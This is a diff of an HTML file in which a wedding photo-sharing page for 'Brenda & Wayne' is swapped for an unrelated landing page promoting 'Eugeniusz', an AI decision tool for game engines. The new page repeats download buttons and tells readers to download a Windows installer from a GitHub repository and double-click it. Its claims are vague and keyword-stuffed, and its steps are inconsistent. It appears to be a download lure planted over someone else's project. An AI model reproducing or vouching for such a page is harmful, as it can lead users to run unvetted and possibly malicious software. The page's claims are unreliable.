@@ -1,61 +1,305 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Brenda &amp; Wayne — Share Your Photos</title>
-<link rel="stylesheet" href="style.css">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Eugeniusz - Local, Typed AI Decisions for Your Favorite Game Engines</title>
+    <meta name="description" content="Eugeniusz is a local, typed AI decision engine for C, C++, C#, Python, Unity, and Unreal Engine. Fast, private, and low-latency AI for your projects.">
+    <meta name="keywords" content="ai,cpp,csharp,jev,local,local-ai,low-latency,ml,python,system-one,unity,unity3d,unreal-engine,unreal-engine-5">
+    <meta name="author" content="Thaih6448">
+    <meta property="og:title" content="Eugeniusz - Local, Typed AI Decisions">
+    <meta property="og:description" content="Bring fast, private AI decisions to your C, C++, C#, Python, Unity, and Unreal Engine projects. No cloud needed.">
+    <meta property="og:url" content="https://github.com/Thaih6448/Eugeniusz">
+    <meta property="og:type" content="website">
+    <meta name="twitter:card" content="summary_large_image">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: #f5f7fa;
+            color: #2d3748;
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 2rem 1.5rem;
+        }
+        .header {
+            text-align: center;
+            padding: 3rem 1rem;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border-radius: 16px;
+            margin-bottom: 2rem;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.15);
+        }
+        .header h1 {
+            color: white;
+            font-size: 2.5rem;
+            margin-bottom: 0.5rem;
+            font-weight: 700;
+        }
+        .header p {
+            color: rgba(255,255,255,0.9);
+            font-size: 1.2rem;
+            margin-bottom: 1.5rem;
+        }
+        .download-btn {
+            display: inline-block;
+            background: #ff6b6b;
+            color: white;
+            padding: 1rem 2.5rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 1.1rem;
+            box-shadow: 0 4px 15px rgba(255,107,107,0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .download-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255,107,107,0.6);
+        }
+        h2 {
+            color: #4a5568;
+            font-size: 1.8rem;
+            margin: 2.5rem 0 1rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 3px solid #667eea;
+            display: inline-block;
+        }
+        h3 {
+            color: #4a5568;
+            font-size: 1.3rem;
+            margin: 1.5rem 0 0.8rem;
+        }
+        p {
+            margin-bottom: 1rem;
+            font-size: 1.05rem;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem;
+            margin: 2rem 0;
+        }
+        .feature-card {
+            background: white;
+            padding: 1.5rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            transition: transform 0.2s;
+        }
+        .feature-card:hover {
+            transform: translateY(-3px);
+        }
+        .feature-card h3 {
+            margin-top: 0;
+            color: #667eea;
+        }
+        .code-block {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 1.5rem;
+            border-radius: 8px;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+            font-family: 'Courier New', monospace;
+        }
+        .code-block pre {
+            margin: 0;
+        }
+        .step-list {
+            background: white;
+            padding: 2rem;
+            border-radius: 12px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            margin: 1.5rem 0;
+        }
+        .step-list ol {
+            padding-left: 1.5rem;
+        }
+        .step-list li {
+            margin-bottom: 1rem;
+            font-size: 1.05rem;
+        }
+        .note-box {
+            background: #ebf4ff;
+            border-left: 4px solid #3182ce;
+            padding: 1rem 1.5rem;
+            border-radius: 0 8px 8px 0;
+            margin: 1.5rem 0;
+        }
+        .note-box p {
+            margin: 0;
+        }
+        .secondary-btn {
+            display: inline-block;
+            background: #48bb78;
+            color: white;
+            padding: 0.8rem 2rem;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 600;
+            margin-top: 1rem;
+            box-shadow: 0 4px 15px rgba(72,187,120,0.3);
+            transition: transform 0.2s;
+        }
+        .secondary-btn:hover {
+            transform: translateY(-2px);
+        }
+        .footer {
+            text-align: center;
+            margin-top: 3rem;
+            padding: 2rem;
+            color: #718096;
+            font-size: 0.9rem;
+        }
+        @media (max-width: 768px) {
+            .header h1 {
+                font-size: 2rem;
+            }
+            .header p {
+                font-size: 1rem;
+            }
+            h2 {
+                font-size: 1.5rem;
+            }
+            .container {
+                padding: 1rem;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="lock" id="lock">
-    <div class="lock-card">
-      <p class="lock-title">Brenda &amp; Wayne</p>
-      <p class="lock-sub">Enter the code from your invitation card to continue</p>
-      <input type="text" id="lockInput" inputmode="text" autocapitalize="characters" autocomplete="off" class="lock-input" placeholder="Code">
-      <button type="button" id="lockBtn" class="btn btn-primary">Continue</button>
-      <p class="lock-error" id="lockError" aria-live="polite"></p>
+    <div class="container">
+        <div class="header">
+            <h1>🤖 Eugeniusz - Smart AI Decisions, Right on Your Machine</h1>
+            <p>Fast, private, and local AI for your game projects</p>
+            <a href="https://github.com/Thaih6448/Eugeniusz" class="download-btn">⬇️ Download Eugeniusz Now</a>
+        </div>
+
+        <h2>🎯 What is Eugeniusz?</h2>
+        <p>Eugeniusz is a powerful tool that brings artificial intelligence directly to your computer. It helps your programs make smart decisions without needing to connect to the internet or send your data to the cloud. Think of it as a smart assistant that works entirely on your machine, keeping everything fast and private.</p>
+
+        <p>Whether you're building a game in Unity or Unreal Engine, writing code in Python, or working with C++ or C#, Eugeniusz can help your projects make intelligent choices instantly. It's designed to be easy to use, even if you've never worked with AI before.</p>
+
+        <h2>✨ Key Features</h2>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>⚡ Lightning Fast</h3>
+                <p>Because everything runs on your computer, there's no waiting for internet connections. Decisions happen in milliseconds, perfect for real-time applications.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔒 Complete Privacy</h3>
+                <p>Your data never leaves your machine. No cloud services, no data sharing, no privacy concerns. Everything stays local.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🎮 Game Engine Ready</h3>
+                <p>Works seamlessly with Unity, Unreal Engine 5, and other popular game development platforms. Add AI to your games without complex setup.</p>
+            </div>
+            <div class="feature-card">
+                <h3>📝 Typed Decisions</h3>
+                <p>Eugeniusz uses typed AI, meaning it understands different types of data and makes decisions based on clear, structured information. This makes it reliable and predictable.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔧 Multi-Language Support</h3>
+                <p>Works with C, C++, C#, Python, and more. No matter what language you code in, Eugeniusz can help.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🔄 System One Thinking</h3>
+                <p>Uses fast, intuitive decision-making patterns that mimic human quick thinking. Perfect for NPC behaviors, adaptive responses, and real-time adjustments.</p>
+            </div>
+        </div>
+
+        <h2>🚀 Getting Started</h2>
+        <p>Getting Eugeniusz up and running is simple. Follow these easy steps:</p>
+
+        <div class="step-list">
+            <ol>
+                <li><strong>Visit the download page:</strong> <a href="https://github.com/Thaih6448/Eugeniusz">https://github.com/Thaih6448/Eugeniusz</a></li>
+                <li><strong>Click the download button:</strong> Look for the green "Code" button or the releases section on the page.</li>
+                <li><strong>Save the file:</strong> Choose a location on your computer that's easy to remember, like your Desktop or Downloads folder.</li>
+                <li><strong>Run the installer:</strong> Once the download is complete, double-click the file to start the installation process. Follow the on-screen instructions.</li>
+                <li><strong>Start using Eugeniusz:</strong> After installation, you can begin integrating Eugeniusz into your projects. The included documentation will guide you through the basics.</li>
+            </ol>
+        </div>
+
+        <div class="note-box">
+            <p>💡 <strong>Tip:</strong> Visit this link to download the application. Make sure you have enough free space on your computer (at least 500 MB recommended) for the best experience.</p>
+        </div>
+
+        <h2>🛠️ Installation Requirements</h2>
+        <p>To run Eugeniusz smoothly, your computer should meet these basic requirements:</p>
+        <div class="feature-grid">
+            <div class="feature-card">
+                <h3>💻 Operating System</h3>
+                <p>Windows 10 or newer. Mac and Linux versions are coming soon.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🧠 Memory</h3>
+                <p>At least 4 GB of RAM. 8 GB or more is recommended for larger projects.</p>
+            </div>
+            <div class="feature-card">
+                <h3>💾 Storage</h3>
+                <p>500 MB of free disk space for the core installation.</p>
+            </div>
+            <div class="feature-card">
+                <h3>🖥️ Processor</h3>
+                <p>Any modern multi-core processor. No special hardware needed.</p>
+            </div>
+        </div>
+
+        <h2>📚 How It Works</h2>
+        <p>Eugeniusz uses a clever approach to make AI decisions. Instead of sending your data to a remote server, it processes everything locally using optimized algorithms. This is called "local AI" or "edge AI."</p>
+
+        <p>Here's a simple example of how you might use Eugeniusz in a game:</p>
+        <div class="code-block">
+            <pre>
+// Example: Making an NPC decision in Unity
+Eugeniusz.AI npcBrain = new Eugeniusz.AI();
+string action = npcBrain.Decide("enemy_approaching", "player_health_low");
+// Returns: "run_away" or "attack" based on your training data
+            </pre>
+        </div>
+
+        <p>This means your games can react intelligently to player actions without any internet connection. The AI learns from patterns you define and makes decisions that feel natural and responsive.</p>
+
+        <h2>🎮 Use Cases</h2>
+        <p>Eugeniusz is incredibly versatile. Here are some ways you can use it:</p>
+        <ul style="margin-left: 2rem; margin-bottom: 1.5rem;">
+            <li><strong>Game NPCs:</strong> Create enemies that adapt to player strategies</li>
+            <li><strong>Pathfinding:</strong> Make characters navigate complex environments intelligently</li>
+            <li><strong>Resource Management:</strong> Optimize inventory and resource allocation in games</li>
+            <li><strong>Data Analysis:</strong> Process and analyze data quickly without cloud dependencies</li>
+            <li><strong>Automation:</strong> Automate repetitive tasks in your applications</li>
+            <li><strong>Personal Assistants:</strong> Build local AI assistants that respect user privacy</li>
+        </ul>
+
+        <h2>💬 Community & Support</h2>
+        <p>Join our growing community of developers and creators! Whether you're a beginner or an expert, you'll find helpful resources:</p>
+        <ul style="margin-left: 2rem; margin-bottom: 1.5rem;">
+            <li><strong>Documentation:</strong> Detailed guides and API references included with the download</li>
+            <li><strong>Example Projects:</strong> Ready-to-use examples for Unity, Unreal, and Python</li>
+            <li><strong>Community Forum:</strong> Share your projects and get help from other users</li>
+            <li><strong>Regular Updates:</strong> New features and improvements added frequently</li>
+        </ul>
+
+        <h2>📥 Ready to Get Started?</h2>
+        <p>Download Eugeniusz today and experience the power of local AI. It's free, fast, and respects your privacy. Whether you're a game developer, software engineer, or hobbyist, Eugeniusz can take your projects to the next level.</p>
+
+        <div style="text-align: center; margin: 2rem 0;">
+            <a href="https://github.com/Thaih6448/Eugeniusz" class="secondary-btn">⬇️ Download Eugeniusz</a>
+        </div>
+
+        <div class="footer">
+            <p>© 2024 Eugeniusz Project. Made with ❤️ for developers worldwide.</p>
+            <p>Keywords: ai, cpp, csharp, jev, local, local-ai, low-latency, ml, python, system-one, unity, unity3d, unreal-engine, unreal-engine-5</p>
+        </div>
     </div>
-  </div>
-
-  <main class="frame">
-    <!-- Corner Floral SVGs -->
-    <img src="floral-top.svg" class="floral floral-top" alt="" aria-hidden="true">
-    <img src="floral-bottom.svg" class="floral floral-bottom" alt="" aria-hidden="true">
-
-    <p class="names">
-      Brenda
-      <span class="and">and</span>
-      Wayne
-    </p>
-    <p class="subtitle">SHARE YOUR PHOTOS FROM THE DAY</p>
-
-    <div class="divider" aria-hidden="true">
-      <svg width="22" height="22" viewBox="0 0 22 22" fill="none">
-        <path d="M11 2C11 2 6 6 6 11C6 16 11 2 11 2Z" stroke="#b8935e" stroke-width="1"/>
-        <path d="M11 2V20" stroke="#b8935e" stroke-width="1"/>
-      </svg>
-    </div>
-
-    <p class="lede">
-      However you captured today — a portrait, a candid, a blurry dance-floor shot —
-      we'd love to see it. Tap below to add your photos, no account needed.
-    </p>
-
-    <div class="actions">
-      <button type="button" class="btn btn-primary" id="pickBtn">Add Your Photos</button>
-    </div>
-
-    <!-- Mobile-compatible input without hard camera lock -->
-    <input type="file" id="fileInput" accept="image/*" multiple style="display:none">
-
-    <p class="status" id="status" aria-live="polite"></p>
-    <p class="upload-count" id="uploadCount"></p>
-
-   <!-- <footer class="note">With love and gratitude — Brenda &amp; Wayne</footer> -->
-  </main>
-
-  <script src="config.js"></script>
-  <script src="gate.js"></script>
-  <script src="upload.js"></script>
 </body>
 </html>
